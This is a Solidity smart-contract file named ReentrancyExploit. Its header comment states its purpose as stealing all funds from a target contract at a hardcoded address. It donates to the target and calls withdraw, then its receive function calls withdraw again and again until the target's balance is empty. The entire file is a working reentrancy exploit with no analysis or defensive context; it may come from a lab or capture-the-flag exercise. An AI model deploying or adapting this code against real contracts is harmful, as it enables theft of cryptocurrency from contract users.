// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

interface VulnContract {
    function withdraw(uint _amount) external;
    function donate(address _to) external payable;
}

/**
 * @title ReentrancyExploit
 * @dev Since balances are updated AFTER the receive is finished, call withdraw again in the receive function to steal all the funds
 * @custom:dev-run-script ./scripts/deploy_with_ethers.ts
 */
 contract ReentrancyExploit {
    address vuln_contract = address(0xc68E2D2124e90123679d2922143174f603C69b55);
    uint funding_amount;

    constructor() payable {
        funding_amount = msg.value;
        VulnContract(vuln_contract).donate{value: funding_amount}(address(this));
    }

    function setContract(address _c) public {
        require(_c != vuln_contract);
        vuln_contract = _c;
    }

    function setFundingAmount() public payable {
        funding_amount = msg.value;
        VulnContract(vuln_contract).donate{value: funding_amount}(address(this));
    }

    function exploit() public {
        VulnContract(vuln_contract).withdraw(funding_amount);
    }

    receive() external payable {
        if (vuln_contract.balance > 0){
            // Call withdraw - reentrancy
            VulnContract(vuln_contract).withdraw(funding_amount);
        }
    }
}